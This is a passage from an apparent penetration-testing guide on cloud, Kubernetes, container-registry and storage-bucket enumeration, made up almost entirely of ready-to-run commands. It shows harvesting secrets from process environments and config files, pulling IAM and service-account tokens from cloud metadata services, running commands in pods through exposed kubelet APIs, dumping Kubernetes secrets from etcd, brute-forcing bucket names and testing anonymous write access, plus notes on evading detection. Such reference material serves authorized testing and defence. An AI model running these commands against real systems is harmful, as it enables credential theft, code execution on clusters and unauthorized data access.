grep -r "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" /app /var/www /tmp 2>/dev/null

# Kubernetes secrets (if mounted)
find /var/run/secrets/ -type f -exec cat {} \; 2>/dev/null

# Environment variables of all processes
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "password\|secret\|key\|token"
done | sort -u
```

**Application-Specific Locations**

```bash
# Web applications
ls -la /var/www/html/
cat /var/www/html/config.php
cat /var/www/html/.env

# Node.js
cat /app/package.json
cat /app/.env
ls -la /app/node_modules/

# Python
cat /app/settings.py
cat /app/config.py
cat /app/.env

# Ruby/Rails
cat /app/config/database.yml
cat /app/config/secrets.yml

# Java
find / -name "application.properties" -o -name "application.yml" 2>/dev/null

# Git repositories (often contain secrets in history)
find / -name ".git" -type d 2>/dev/null
# If found:
cd <git_repo>
git log -p | grep -i "password\|secret\|key"
```

## Cloud & Container Security Best Practices

**Detection Evasion Considerations:**

- Cloud APIs log all actions (CloudTrail, Azure Activity Log, GCP Cloud Logging)
- Metadata service access may be logged
- Unusual API calls or permission enumeration can trigger alerts
- Container escapes often leave kernel logs and audit trails
- Multiple failed authentication attempts trigger alerting in mature environments

**Common Misconfigurations:**

- Public S3/Storage buckets with sensitive data
- IMDS accessible without IMDSv2/token requirement
- Overly permissive IAM roles (wildcard permissions)
- Exposed Docker sockets or APIs
- Privileged containers with host filesystem mounts
- Secrets in environment variables or image layers
- Public snapshots/images containing credentials
- Weak network segmentation between containers

**Enumeration Artifacts:**

```bash
# Cloud provider logs capture:
# - API calls with source IP and user agent
# - Resource access attempts (success and failure)
# - IAM policy changes
# - Credential usage patterns

# Container logs may reveal:
# - Process creation (especially shells)
# - Network connections
# - File access patterns
# - Capability usage
```

## Key Tools Summary

**AWS:**

- **aws-cli**: Official AWS command-line interface
- **Pacu**: AWS exploitation framework
- **enumerate-iam.py**: Permission discovery
- **ScoutSuite**: Multi-cloud security assessment
- **S3Scanner**: Public S3 bucket discovery

**Azure:**

- **az-cli**: Official Azure command-line interface
- **ROADTools**: Azure AD enumeration and exploitation
- **MicroBurst**: PowerShell-based Azure assessment
- **AzureHound**: BloodHound for Azure AD
- **AADInternals**: Azure AD attack toolkit

**GCP:**

- **gcloud**: Official GCP command-line interface
- **gsutil**: GCP storage utility
- **GCPBucketBrute**: GCP bucket discovery
- **ScoutSuite**: GCP security assessment
- **gcp-iam-privilege-escalation**: IAM escalation scanner

**Docker/Containers:**

- **DeepCE**: Automated container enumeration
- **CDK**: Container security toolkit
- **Amicontained**: Container introspection
- **docker-bench-security**: CIS compliance checking
- **kubectl**: Kubernetes command-line tool

## Critical Enumeration Targets

**Cloud Priority Targets:**

1. **Metadata services** - Instant credentials and instance information
2. **IAM roles/policies** - Understand current permissions and escalation paths
3. **Storage buckets** - Often contain backups, logs, and sensitive data
4. **Secrets management** - Centralized credential storage
5. **Database services** - Connection strings and data access
6. **Function/serverless code** - Often contains hardcoded credentials
7. **Snapshots/backups** - Historical data and configurations

**Container Priority Targets:**

1. **Docker socket** - Full container control and host access
2. **Service account tokens** - Kubernetes API access
3. **Environment variables** - Application credentials
4. **Mounted volumes** - Host filesystem access
5. **Capabilities** - Privilege escalation vectors
6. **Network access** - Internal service discovery
7. **Image layers** - Historical secrets and deleted files

---

**Related Critical Topics:** After cloud and container enumeration, proceed to credential harvesting from discovered services, exploiting identified misconfigurations (SSRF to metadata, privilege escalation via IAM), and pivoting through interconnected cloud resources or container networks.

---

## Kubernetes Enumeration

Kubernetes (K8s) is a container orchestration platform that manages clusters of containerized applications. Enumeration focuses on discovering cluster resources, identifying misconfigurations, and mapping attack surfaces through the Kubernetes API server, kubectl CLI, and metadata services.

### Kubernetes Architecture Overview

**Core Components**:

- **API Server**: Central management point, REST API for cluster operations (typically TCP 6443, 8443, or 443)
- **etcd**: Distributed key-value store containing cluster state and secrets
- **Kubelet**: Node agent running on each worker node (typically TCP 10250)
- **Controller Manager**: Manages cluster state
- **Scheduler**: Assigns pods to nodes
- **Pods**: Smallest deployable units containing one or more containers
- **Services**: Expose pod groups via stable endpoints
- **Namespaces**: Virtual clusters for resource isolation

### Discovering Kubernetes Clusters

**Network Scanning for Kubernetes**

```bash
# Scan for API server ports
nmap -p 6443,8443,10250,10255,2379,2380 192.168.1.0/24

# Version detection on discovered ports
nmap -sV -p 6443 192.168.1.50

# Script scanning for Kubernetes
nmap --script kubernetes-* -p 6443 192.168.1.50
```

**Common Kubernetes Ports**:

- TCP 6443/8443: API Server (HTTPS)
- TCP 8080: API Server (HTTP, insecure, deprecated)
- TCP 10250: Kubelet API (read/write)
- TCP 10255: Kubelet API (read-only, deprecated)
- TCP 2379-2380: etcd client/peer communication
- TCP 30000-32767: NodePort service range

**Cloud Provider Metadata Services**

Kubernetes clusters on cloud platforms expose metadata through provider-specific endpoints:

**AWS EKS Metadata**

```bash
# From within pod/instance
curl http://169.254.169.254/latest/meta-data/

# IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**GCP GKE Metadata**

```bash
# From within pod/instance
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Service account token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project information
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
```

**Azure AKS Metadata**

```bash
# From within pod/instance
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed identity token
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Kubectl Enumeration

kubectl is the standard CLI tool for interacting with Kubernetes clusters. Enumeration assumes you have obtained kubeconfig credentials or service account tokens.

**Finding Kubeconfig**

```bash
# Default location
cat ~/.kube/config

# Environment variable
echo $KUBECONFIG

# Common locations
cat /etc/kubernetes/admin.conf
cat /var/lib/kubelet/kubeconfig
cat /root/.kube/config
```

**Basic Cluster Information**

```bash
# Cluster information
kubectl cluster-info

# API server version
kubectl version

# Node information
kubectl get nodes
kubectl get nodes -o wide
kubectl describe nodes

# Namespaces
kubectl get namespaces
kubectl get ns
```

**Enumerating Resources**

**Pods**

```bash
# List all pods in current namespace
kubectl get pods

# List pods in all namespaces
kubectl get pods --all-namespaces
kubectl get pods -A

# Detailed pod information
kubectl describe pod <pod-name>
kubectl describe pod <pod-name> -n <namespace>

# Pod YAML configuration
kubectl get pod <pod-name> -o yaml

# Running containers in pod
kubectl get pods <pod-name> -o jsonpath='{.spec.containers[*].name}'
```

**Services**

```bash
# List services
kubectl get services
kubectl get svc -A

# Service details
kubectl describe service <service-name>

# Service endpoints
kubectl get endpoints
```

**Deployments, ReplicaSets, DaemonSets**

```bash
kubectl get deployments -A
kubectl get replicasets -A
kubectl get daemonsets -A
kubectl get statefulsets -A
```

**ConfigMaps and Secrets**

```bash
# List ConfigMaps
kubectl get configmaps -A
kubectl get cm -A

# ConfigMap contents
kubectl describe configmap <configmap-name>
kubectl get configmap <configmap-name> -o yaml

# List Secrets
kubectl get secrets -A

# Secret contents (base64 encoded)
kubectl get secret <secret-name> -o yaml
kubectl get secret <secret-name> -o jsonpath='{.data}'

# Decode secret
kubectl get secret <secret-name> -o jsonpath='{.data.password}' | base64 -d
```

**Service Accounts and RBAC**

```bash
# Service accounts
kubectl get serviceaccounts -A
kubectl get sa -A

# Roles and ClusterRoles
kubectl get roles -A
kubectl get clusterroles

# RoleBindings and ClusterRoleBindings
kubectl get rolebindings -A
kubectl get clusterrolebindings

# Check permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces
```

**Persistent Volumes**

```bash
kubectl get pv
kubectl get pvc -A
kubectl describe pv <pv-name>
```

**Ingress Resources**

```bash
kubectl get ingress -A
kubectl describe ingress <ingress-name>
```

**Network Policies**

```bash
kubectl get networkpolicies -A
kubectl describe networkpolicy <policy-name>
```

### Enumerating from Within a Pod

When you have execution access inside a container/pod, enumerate using mounted service account tokens and the internal API.

**Service Account Token Location**

```bash
# Default service account token path
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

**Using Token with curl**

```bash
# Store token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Query API server
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

**Installing kubectl in Container**

```bash
# Download kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Use with service account
./kubectl --token=$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --server=$APISERVER get pods
```

**Automated Enumeration Tools**

**kubeletctl**

```bash
# Install
wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 kubeletctl

# Scan for kubelet
./kubeletctl scan --cidr 192.168.1.0/24

# Get pods (unauthenticated kubelet)
./kubeletctl -s 192.168.1.50 pods

# Run command in pod
./kubeletctl -s 192.168.1.50 exec "whoami" -p <pod-name> -c <container-name>

# Get kubelet config
./kubeletctl -s 192.168.1.50 config
```

**kubectl-who-can**

```bash
# Install
kubectl krew install who-can

# Check who can perform actions
kubectl who-can create pods
kubectl who-can get secrets --all-namespaces
kubectl who-can '*' '*'
```

**kubeaudit**

```bash
# Install
wget https://github.com/Shopify/kubeaudit/releases/download/v0.22.0/kubeaudit_0.22.0_linux_amd64.tar.gz
tar -xzf kubeaudit_0.22.0_linux_amd64.tar.gz

# Audit all resources
./kubeaudit all

# Specific checks
./kubeaudit privesc
./kubeaudit caps
./kubeaudit limits
```

**kube-hunter**

```bash
# Install
pip install kube-hunter

# Hunt from network perspective
kube-hunter --remote <cluster-ip>

# Hunt from pod perspective
kube-hunter --pod

# Active hunting (exploits misconfigurations)
kube-hunter --active
```

**Usage Example**

```bash
kube-hunter --remote 192.168.1.50
# Reports:
# - Open ports
# - API server access
# - Anonymous authentication
# - Exposed dashboard
# - Privilege escalation paths
```

**Peirates**

```bash
# Kubernetes penetration testing tool
git clone https://github.com/inguardians/peirates
cd peirates
go build

# Run from within pod
./peirates

# Interactive menu provides:
# - Service account token enumeration
# - Pod enumeration
# - Secret extraction
# - Privilege escalation
# - Lateral movement
```

### Kubelet API Enumeration

The Kubelet API exposes node-level operations and can be exploited if not properly secured.

**Read-Only Port (10255) - Deprecated**

```bash
# List pods on node (no authentication)
curl http://192.168.1.50:10255/pods

# Spec endpoint
curl http://192.168.1.50:10255/spec

# Stats
curl http://192.168.1.50:10255/stats
```

**Read-Write Port (10250)**

```bash
# Check if anonymous authentication allowed
curl -k https://192.168.1.50:10250/pods

# With client certificate
curl --cert client.crt --key client.key -k https://192.168.1.50:10250/pods

# Execute command in container
curl -k -XPOST "https://192.168.1.50:10250/run/<namespace>/<pod-name>/<container-name>" -d "cmd=whoami"

# Using kubeletctl
kubeletctl -s 192.168.1.50 exec "id" -p <pod-name> -c <container-name>
```

### Kubernetes Dashboard Enumeration

**Discovering Dashboard**

```bash
# Check for service
kubectl get services --all-namespaces | grep dashboard

# Common URLs
https://<cluster-ip>:443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
http://<node-ip>:30000  # NodePort exposure
```

**Accessing Dashboard**

```bash
# Skip login (if allowed)
# Depends on RBAC configuration

# Using token
kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk '{print $1}')

# Port-forward to local
kubectl port-forward -n kubernetes-dashboard service/kubernetes-dashboard 8443:443
# Access: https://localhost:8443
```

### Etcd Enumeration

etcd stores all cluster data including secrets. Direct access provides complete cluster compromise.

**Connecting to etcd**

```bash
# etcd client
etcdctl --endpoints=https://192.168.1.50:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# List all keys
etcdctl --endpoints=https://192.168.1.50:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix
```

**Extracting Secrets from etcd**

```bash
# Get secrets
etcdctl get /registry/secrets/default/<secret-name>

# Get all secrets
etcdctl get /registry/secrets/ --prefix
```

[Unverified: Direct etcd access typically requires certificates that are only present on control plane nodes. Remote access without proper certificates is generally not possible unless etcd is severely misconfigured.]

### Kubernetes Enumeration from ServiceAccount

**Determining Current Context**

```bash
# Inside pod
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Current service account
kubectl auth whoami
kubectl get serviceaccount -n <current-namespace>
```

**Privilege Enumeration**

```bash
# What can current SA do?
kubectl auth can-i --list

# Specific permissions
kubectl auth can-i create pods
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
```

**Horizontal Enumeration**

```bash
# List accessible namespaces
kubectl get namespaces

# Enumerate each namespace
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl get pods -n $ns 2>/dev/null
  kubectl get secrets -n $ns 2>/dev/null
done
```

### Container Escape and Node Access

Once on a node (after container escape), enumerate the full Kubernetes control plane.

**Finding Kubernetes Credentials**

```bash
# Kubeconfig files
find / -name "*.kubeconfig" 2>/dev/null
find / -name "config" -path "*/.kube/*" 2>/dev/null

# Certificate files
find /etc/kubernetes/pki/ -type f 2>/dev/null
ls -la /var/lib/kubelet/pki/

# Service account tokens
find / -path "*/serviceaccount/token" 2>/dev/null
```

**Manifest Files**

```bash
# Static pod manifests
ls -la /etc/kubernetes/manifests/
cat /etc/kubernetes/manifests/kube-apiserver.yaml
cat /etc/kubernetes/manifests/etcd.yaml
```

**Kubelet Configuration**

```bash
cat /var/lib/kubelet/config.yaml
ps aux | grep kubelet
```

## Container Registry Access

Container registries store Docker/OCI images that contain applications, dependencies, and often sensitive data like credentials and secrets. Registries can be public (Docker Hub) or private (Harbor, AWS ECR, GCR, ACR).

### Docker Hub Enumeration

**Public Repository Discovery**

```bash
# Search for organization/user repositories
curl "https://hub.docker.com/v2/repositories/<username>/" | jq

# List repository tags
curl "https://hub.docker.com/v2/repositories/<username>/<repo>/tags/" | jq

# Get specific tag details
curl "https://hub.docker.com/v2/repositories/<username>/<repo>/tags/<tag>/" | jq
```

**Pulling and Analyzing Images**

```bash
# Pull image
docker pull <username>/<repo>:<tag>

# Inspect image
docker inspect <username>/<repo>:<tag>

# Extract filesystem
docker save <username>/<repo>:<tag> -o image.tar
tar -xf image.tar

# Analyze layers
cd <layer-hash>
tar -xf layer.tar
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
```

**Searching for Sensitive Information**

```bash
# Search for credentials in image history
docker history <image-name>
docker history --no-trunc <image-name>

# Check environment variables
docker inspect <image-name> | jq '.[].Config.Env'

# Extract and search all layers
for layer in $(docker inspect <image> | jq -r '.[].RootFS.Layers[]'); do
  echo "=== Layer: $layer ==="
  # Analysis of each layer
done
```

### Private Registry Enumeration

**Docker Registry API v2**

**Catalog Endpoint**

```bash
# List repositories (if allowed)
curl http://registry.example.com:5000/v2/_catalog

# With authentication
curl -u username:password http://registry.example.com:5000/v2/_catalog
```

**Repository Tags**

```bash
# List tags for repository
curl http://registry.example.com:5000/v2/<repository>/tags/list

# Example
curl http://registry.example.com:5000/v2/myapp/tags/list
```

**Image Manifests**

```bash
# Get manifest
curl http://registry.example.com:5000/v2/<repository>/manifests/<tag>

# Download layers
curl http://registry.example.com:5000/v2/<repository>/blobs/<digest>
```

**Authentication Testing**

```bash
# Test anonymous access
curl -I http://registry.example.com:5000/v2/_catalog

# Token-based authentication
curl http://registry.example.com:5000/v2/

# Extract authentication realm and service
# Request token, then use for subsequent requests
```

### AWS Elastic Container Registry (ECR)

**Prerequisites: AWS CLI configured with credentials**

**Listing Repositories**

```bash
# List all repositories
aws ecr describe-repositories

# Specific region
aws ecr describe-repositories --region us-east-1

# Get repository URI
aws ecr describe-repositories --query 'repositories[*].[repositoryUri]' --output text
```

**Listing Images**

```bash
# List images in repository
aws ecr list-images --repository-name <repo-name>

# Describe images with details
aws ecr describe-images --repository-name <repo-name>

# Get image tags
aws ecr describe-images --repository-name <repo-name> --query 'imageDetails[*].[imageTags[0],imagePushedAt]' --output table
```

**ECR Authentication**

```bash
# Get login password
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin <account-id>.dkr.ecr.us-east-1.amazonaws.com

# Pull image
docker pull <account-id>.dkr.ecr.us-east-1.amazonaws.com/<repo>:<tag>
```

**ECR Policy Enumeration**

```bash
# Get repository policy
aws ecr get-repository-policy --repository-name <repo-name>

# Check for public access
aws ecr get-repository-policy --repository-name <repo-name> | grep -i "Principal.*\*"
```

**ECR Cross-Account Access**

```bash
# If policy allows cross-account
# Use credentials from different account
aws ecr list-images --repository-name <repo-name> --registry-id <target-account-id>
```

### Google Container Registry (GCR)

**Using gcloud**

```bash
# List repositories
gcloud container images list --repository=gcr.io/<project-id>

# List tags
gcloud container images list-tags gcr.io/<project-id>/<image>

# Describe image
gcloud container images describe gcr.io/<project-id>/<image>:<tag>
```

**Using Docker**

```bash
# Authenticate
gcloud auth configure-docker

# Or with service account key
cat key.json | docker login -u _json_key --password-stdin https://gcr.io

# Pull image
docker pull gcr.io/<project-id>/<image>:<tag>
```

**GCR API Access**

```bash
# List images via API
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://gcr.io/v2/<project-id>/<image>/tags/list"

# Get manifest
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://gcr.io/v2/<project-id>/<image>/manifests/<tag>"
```

**Public GCR Repositories**

```bash
# Some GCR repositories are public
curl "https://gcr.io/v2/<project-id>/<image>/tags/list"

# Common public projects
curl "https://gcr.io/v2/google-containers/<image>/tags/list"
```

### Azure Container Registry (ACR)

**Using Azure CLI**

```bash
# List registries
az acr list

# List repositories
az acr repository list --name <registry-name>

# List tags
az acr repository show-tags --name <registry-name> --repository <repo-name>

# Show manifest
az acr repository show-manifests --name <registry-name> --repository <repo-name>
```

**ACR Authentication**

```bash
# Get credentials
az acr credential show --name <registry-name>

# Docker login
az acr login --name <registry-name>

# Or manual login
docker login <registry-name>.azurecr.io -u <username> -p <password>
```

**ACR Webhooks and Tasks**

```bash
# List webhooks
az acr webhook list --registry <registry-name>

# List tasks
az acr task list --registry <registry-name>
```

### Harbor Registry

Harbor is an open-source private registry with additional security features.

**API Endpoints**

```bash
# List projects (public access)
curl https://harbor.example.com/api/v2.0/projects

# With authentication
curl -u username:password https://harbor.example.com/api/v2.0/projects

# List repositories in project
curl -u username:password https://harbor.example.com/api/v2.0/projects/<project-name>/repositories

# List artifacts
curl -u username:password https://harbor.example.com/api/v2.0/projects/<project-name>/repositories/<repo-name>/artifacts
```

**Harbor Vulnerabilities**

```bash
# Check for CVE-2019-16097 (privilege escalation)
# Affects Harbor < 1.7.6, 1.8.x < 1.8.3

# Check for authentication bypass
curl -X POST https://harbor.example.com/api/repositories
```

### Automated Registry Scanning

**reg (Docker Registry CLI)**

```bash
# Install
go install github.com/genuinetools/reg@latest

# List repositories
reg ls registry.example.com:5000

# List tags
reg tags registry.example.com:5000/<repo>

# Pull and save
reg pull registry.example.com:5000/<repo>:<tag>
```

**crane (Google's Container Tools)**

```bash
# Install
go install github.com/google/go-containerregistry/cmd/crane@latest

# List repositories
crane catalog registry.example.com:5000

# List tags
crane ls registry.example.com:5000/<repo>

# Copy image
crane copy src-registry/image:tag dst-registry/image:tag
```

**docker-ls**

```bash
# Install
pip install docker-ls

# List repositories
docker-ls repositories https://registry.example.com:5000

# List tags
docker-ls tags https://registry.example.com:5000 <repo>
```

### Image Analysis for Secrets

**Dive - Layer Analysis**

```bash
# Install
wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb
dpkg -i dive_0.11.0_linux_amd64.deb

# Analyze image
dive <image-name>

# CI mode (exit with error if inefficient)
dive --ci <image-name>
```

**Trivy - Vulnerability Scanner**

```bash
# Install
wget https://github.com/aquasecurity/trivy/releases/download/v0.48.0/trivy_0.48.0_Linux-64bit.deb
dpkg -i trivy_0.48.0_Linux-64bit.deb

# Scan image
trivy image <image-name>

# Scan for secrets
trivy image --scanners secret <image-name>

# Scan registry
trivy image registry.example.com:5000/<repo>:<tag>
```

**Grype - Vulnerability Scanner**

```bash
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

# Scan image
grype <image-name>

# Output formats
grype <image-name> -o json
grype <image-name> -o table
```

**TruffleHog - Secret Detection**

```bash
# Install
pip install truffleHog

# Scan Docker image
docker save <image-name> -o image.tar
trufflehog filesystem ./image.tar
```

**Manual Secret Extraction**

```bash
# Export image
docker save <image> -o image.tar
mkdir image_extracted
tar -xf image.tar -C image_extracted

# Search for secrets
cd image_extracted
grep -r "password" .
grep -r "api_key" .
grep -r "BEGIN.*PRIVATE KEY" .
grep -r "aws_access_key" .

# Check environment variables in config
cat */json | jq '.config.Env'

# Examine history
cat manifest.json | jq
```

## Cloud Storage Bucket Discovery

Cloud storage buckets (AWS S3, Google Cloud Storage, Azure Blob Storage) frequently contain sensitive data and are often misconfigured for public access.

### AWS S3 Enumeration

**Bucket Naming Conventions**

```
S3 buckets: <bucket-name>.s3.amazonaws.com
Regional: <bucket-name>.s3.<region>.amazonaws.com
Path-style (deprecated): s3.amazonaws.com/<bucket-name>
```

**Testing Bucket Existence**

```bash
# Via curl
curl -I https://<bucket-name>.s3.amazonaws.com

# 200 OK = exists and publicly accessible
# 403 Forbidden = exists but not publicly accessible
# 404 Not Found = doesn't exist

# Via AWS CLI (requires credentials)
aws s3 ls s3://<bucket-name>
```

**Listing Bucket Contents**

```bash
# Public bucket
aws s3 ls s3://<bucket-name> --no-sign-request

# With credentials
aws s3 ls s3://<bucket-name>

# Recursive listing
aws s3 ls s3://<bucket-name> --recursive

# Via HTTP
curl https://<bucket-name>.s3.amazonaws.com/
```

**Downloading Bucket Contents**

```bash
# Download specific file
aws s3 cp s3://<bucket-name>/file.txt . --no-sign-request

# Download entire bucket
aws s3 sync s3://<bucket-name> ./local-dir --no-sign-request

# Via wget
wget -r --no-parent https://<bucket-name>.s3.amazonaws.com/
```

**Bucket Policy Enumeration**

```bash
# Get bucket policy (requires permissions)
aws s3api get-bucket-policy --bucket <bucket-name>

# Check ACL
aws s3api get-bucket-acl --bucket <bucket-name>

# Check public access block
aws s3api get-public-access-block --bucket <bucket-name>
```

**Bucket Discovery Techniques**

**DNS Brute Force**

```bash
# Using massdns
echo "bucket-name" | massdns -r resolvers.txt -t A -o S | grep s3

# Generate wordlist
for word in $(cat wordlist.txt); do
  echo "$word.s3.amazonaws.com"
done > s3-buckets.txt

# Test buckets
while read bucket; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket")
  if [ "$response" != "404" ]; then
    echo "[+] Found: $bucket ($response)"
  fi
done < s3-buckets.txt
```

**Certificate Transparency Logs**

```bash
# Search crt.sh for S3 buckets
curl -s "https://crt.sh/?q=%.s3.amazonaws.com&output=json" | jq -r '.[].name_value' | sort -u

# Filter for specific domain
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | grep s3
```

**Google Dorking for S3**

```
site:s3.amazonaws.com "example"
site:s3.amazonaws.com intitle:"index of" "backup"
site:s3.amazonaws.com filetype:pdf "confidential"
inurl:".s3.amazonaws.com"
```

**Automated S3 Scanners**

**S3Scanner**

```bash
# Install
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip install -r requirements.txt

# Scan from wordlist
python3 s3scanner.py --bucket-file buckets.txt

# Scan with dump
python3 s3scanner.py --bucket-file buckets.txt --dump
```

**S3Bucket Finder (lazy-s3)**

```bash
# Install
go install github.com/nahamsec/lazys3@latest

# Scan
lazys3 -bucket-file buckets.txt
```

**AWSBucketDump**

```bash
# Install
git clone https://github.com/jordanpotti/AWSBucketDump
cd AWSBucketDump
pip install -r requirements.txt

# Scan and download
python3 AWSBucketDump.py -l buckets.txt -g interesting_keywords.txt
```

**Slurp**

```bash
# Install
go install github.com/0xbharath/slurp@latest

# Scan domain
slurp domain --domain example.com

# Scan with keywords
slurp keyword --keyword example
```

**Bucket Permissions Testing**

```bash
# Test write access
echo "test" > test.txt
aws s3 cp test.txt s3://<bucket-name>/test.txt --no-sign-request

# Test read access
aws s3 ls s3://<bucket-name> --no-sign-request

# Test list access
aws s3api list-objects --bucket <bucket-name> --no-sign-request
```

**Common Bucket Names to Test**

```
company-backup
company-backups
company-data
company-prod
company-dev
company-test
company-logs
company-assets
company-static
company-web
company-public
company-private
[company]-[environment]-[function]
```

### Google Cloud Storage Enumeration

**Bucket URL Formats**

```
https://storage.googleapis.com/<bucket-name>
https://<bucket-name>.storage.googleapis.com
https://storage.cloud.google.com/<bucket-name>
```

**Testing Bucket Existence**

```bash
# Via curl
curl -I https://storage.googleapis.com/<bucket-name>

# 200 OK = exists and publicly accessible
# 403 Forbidden = exists but not publicly accessible
# 404 Not Found = doesn't exist
```

**Listing Bucket Contents**

```bash
# Public bucket (HTTP)
curl https://storage.googleapis.com/<bucket-name>

# Using gsutil (requires auth)
gsutil ls gs://<bucket-name>

# Recursive listing
gsutil ls -r gs://<bucket-name>

# Public access (no auth)
gsutil ls -r gs://<bucket-name> -u ""
```

**Downloading Contents**

```bash
# Download file
gsutil cp gs://<bucket-name>/file.txt .

# Download entire bucket
gsutil -m cp -r gs://<bucket-name> ./local-dir

# Via wget/curl
wget https://storage.googleapis.com/<bucket-name>/file.txt
curl https://storage.googleapis.com/<bucket-name>/file.txt -o file.txt
```

**Bucket IAM Policy Enumeration**

```bash
# Get bucket IAM policy (requires permissions)
gsutil iam get gs://<bucket-name>

# Check if publicly accessible
gsutil iam get gs://<bucket-name> | grep allUsers
gsutil iam get gs://<bucket-name> | grep allAuthenticatedUsers
```

**GCS API Enumeration**

```bash
# List objects via API
curl "https://storage.googleapis.com/storage/v1/b/<bucket-name>/o"

# With authentication
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://storage.googleapis.com/storage/v1/b/<bucket-name>/o"

# Get bucket metadata
curl "https://storage.googleapis.com/storage/v1/b/<bucket-name>"
```

**GCS Bucket Discovery**

**DNS Enumeration**

```bash
# Generate bucket names
for word in $(cat wordlist.txt); do
  echo "$word.storage.googleapis.com"
done > gcs-buckets.txt

# Test buckets
while read bucket; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${bucket%.storage.googleapis.com}")
  if [ "$response" != "404" ]; then
    echo "[+] Found: $bucket ($response)"
  fi
done < gcs-buckets.txt
```

**Google Dorking for GCS**

```
site:storage.googleapis.com "example"
site:storage.googleapis.com intitle:"index of"
inurl:"storage.googleapis.com" filetype:pdf
```

**GCPBucketBrute**

```bash
# Install
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
cd GCPBucketBrute
pip3 install -r requirements.txt

# Brute force buckets
python3 gcpbucketbrute.py -k keyword -w wordlist.txt
```

**Cloud Storage Finder**

```bash
# Part of CloudBrute
git clone https://github.com/0xsha/CloudBrute
cd CloudBrute
go build

# Scan for GCS buckets
./CloudBrute -d example.com -k gcs -w wordlist.txt
```

### Azure Blob Storage Enumeration

**Blob Storage URL Formats**

```
https://<storage-account>.blob.core.windows.net/<container>
https://<storage-account>.blob.core.windows.net/<container>/<blob>
```

**Testing Container Existence**

```bash
# Via curl
curl -I https://<storage-account>.blob.core.windows.net/<container>

# 200 OK or listing = exists and publicly accessible
# 404 Not Found = doesn't exist or private
# 403 Forbidden = exists but access denied
```

**Listing Container Contents**

```bash
# Public container (HTTP)
curl "https://<storage-account>.blob.core.windows.net/<container>?restype=container&comp=list"

# Using Azure CLI (requires auth)
az storage blob list --account-name <storage-account> --container-name <container>

# Anonymous access
az storage blob list --account-name <storage-account> --container-name <container> --connection-string ""
```

**Downloading Blobs**

```bash
# Via curl/wget
wget https://<storage-account>.blob.core.windows.net/<container>/<blob>

# Using Azure CLI
az storage blob download --account-name <storage-account> --container-name <container> --name <blob> --file ./local-file

# Download entire container
az storage blob download-batch --destination ./local-dir --source <container> --account-name <storage-account>
```

**Azure Storage API**

```bash
# List containers (requires account key or SAS token)
curl -H "x-ms-version: 2019-12-12" \
  -H "Authorization: SharedKey <storage-account>:<signature>" \
  "https://<storage-account>.blob.core.windows.net/?comp=list"

# Get container ACL
curl "https://<storage-account>.blob.core.windows.net/<container>?restype=container&comp=acl"
```

**Shared Access Signature (SAS) Tokens**

SAS tokens provide limited access to Azure Storage resources. If obtained, they enable enumeration and access.

```bash
# Using SAS token in URL
curl "https://<storage-account>.blob.core.windows.net/<container>/<blob>?<sas-token>"

# List with SAS token
curl "https://<storage-account>.blob.core.windows.net/<container>?restype=container&comp=list&<sas-token>"

# With Azure CLI
az storage blob list --account-name <storage-account> --container-name <container> --sas-token "<token>"
```

